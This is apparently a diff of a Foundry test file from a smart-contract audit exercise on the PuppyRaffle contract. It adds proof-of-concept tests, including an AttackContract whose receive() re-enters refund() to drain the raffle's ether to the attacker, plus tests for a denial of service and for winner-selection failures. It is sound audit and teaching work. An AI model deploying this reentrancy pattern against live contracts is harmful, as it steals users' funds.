@@ -5,6 +5,35 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
+contract AttackContract {
+    PuppyRaffle immutable i_raffle;
+    uint256 immutable i_entranceFee;
+    address immutable i_player;
+
+    constructor(PuppyRaffle raffle, uint256 entranceFee) {
+        i_raffle = raffle;
+        i_entranceFee = entranceFee;
+        i_player = msg.sender;
+    }
+
+    function attack(uint256 index) external {
+        if (msg.sender == i_player) {
+            i_raffle.refund(index);
+        }
+    }
+
+    receive() external payable {
+        uint256 index = i_raffle.getActivePlayerIndex(address(this));
+        if (address(i_raffle).balance >= i_entranceFee) {
+            console.log("Entered here: ", address(this).balance);
+            i_raffle.refund(index);
+        } else {
+            (bool success,) = i_player.call{value: address(this).balance}("");
+            console.log("success: ", success);
+        }
+    }
+}
+
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee = 1e18;
@@ -16,11 +45,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -74,6 +99,24 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: Duplicate player");
         puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
     }
+    //@audit-test
+
+    function test_DOS_Attack_On_EnterRaffle() external playersEntered {
+        //1. 4 players entered
+        //2. 2 players asked refunds
+        //3. No one can enter the raffle now
+        uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);
+        uint256 playerThreeIndex = puppyRaffle.getActivePlayerIndex(playerThree);
+        vm.prank(playerOne);
+        puppyRaffle.refund(playerOneIndex);
+        vm.prank(playerThree);
+        puppyRaffle.refund(playerThreeIndex);
+        address[] memory newPlayers = new address[](2);
+        newPlayers[0] = address(5);
+        newPlayers[1] = address(6);
+        vm.expectRevert("PuppyRaffle: Duplicate player");
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
+    }
 
     //////////////////////
     /// Refund         ///
@@ -109,6 +152,28 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: Only the player can refund");
         vm.prank(playerTwo);
         puppyRaffle.refund(indexOfPlayer);
+    }
+
+    //@audit-test
+    function test_Reentrancy_Attack_On_Refund() external playersEntered {
+        address player = makeAddr("Player");
+        uint256 playerInitialBalance = player.balance;
+
+        //1. Deploy the attack contract
+        vm.prank(player);
+        AttackContract attackContract = new AttackContract(puppyRaffle, entranceFee);
+        address[] memory newPlayer = new address[](1);
+        newPlayer[0] = address(attackContract);
+        //2. Enter the raffle
+        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
+        //3. Asks for refund.
+        uint256 attackIndex = puppyRaffle.getActivePlayerIndex(address(attackContract));
+        vm.prank(player);
+        attackContract.attack(attackIndex);
+
+        //4. Drains the pool.
+        assertEq(address(puppyRaffle).balance, 0);
+        assertGt(player.balance, playerInitialBalance);
     }
 
     //////////////////////
@@ -155,6 +220,7 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: Need at least 4 players");
         puppyRaffle.selectWinner();
     }
+    //@audit-bug test case failing
 
     function testSelectWinner() public playersEntered {
         vm.warp(block.timestamp + duration + 1);
@@ -193,6 +259,63 @@ contract PuppyRaffleTest is Test {
 
         puppyRaffle.selectWinner();
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
+    }
+
+    //@audit-test
+    function test_Reverts_If_Refund_Occurs_Before_Winner() external playersEntered {
+        address[] memory newPlayers = new address[](2);
+        newPlayers[0] = makeAddr("player 5");
+        newPlayers[1] = makeAddr("player 6");
+
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
+        uint256 player5Index = puppyRaffle.getActivePlayerIndex(newPlayers[0]);
+        uint256 player6Index = puppyRaffle.getActivePlayerIndex(newPlayers[1]);
+        vm.prank(newPlayers[0]);
+        puppyRaffle.refund(player5Index);
+
+        vm.prank(newPlayers[1]);
+        puppyRaffle.refund(player6Index);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        //Expected to revert
+        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
+        puppyRaffle.selectWinner();
+    }
+    //@audit-test
+
+    function test_Previous_Winner_Is_Always_Addresses_Zero() external playersEntered {
+        address[] memory newPlayers = new address[](2);
+        newPlayers[0] = makeAddr("player 5");
+        newPlayers[1] = makeAddr("player 6");
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        console.log("Winner: ", puppyRaffle.previousWinner());
+        assertEq(puppyRaffle.previousWinner(), address(0));
+    }
+
+    //@audit-test
+    function test_Revert_When_TO_Be_Winner_Takes_Out_Refund() external playersEntered {
+        address[] memory newPlayers = new address[](4);
+        newPlayers[0] = makeAddr("player 5");
+        newPlayers[1] = makeAddr("player 6");
+        newPlayers[2] = makeAddr("player 7");
+        newPlayers[3] = makeAddr("player 8");
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
+        //player 8 is going to be the winner
+        vm.prank(newPlayers[3]);
+        puppyRaffle.refund(7);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.expectRevert("ERC721: mint to the zero address");
+        puppyRaffle.selectWinner();
     }
 
     //////////////////////
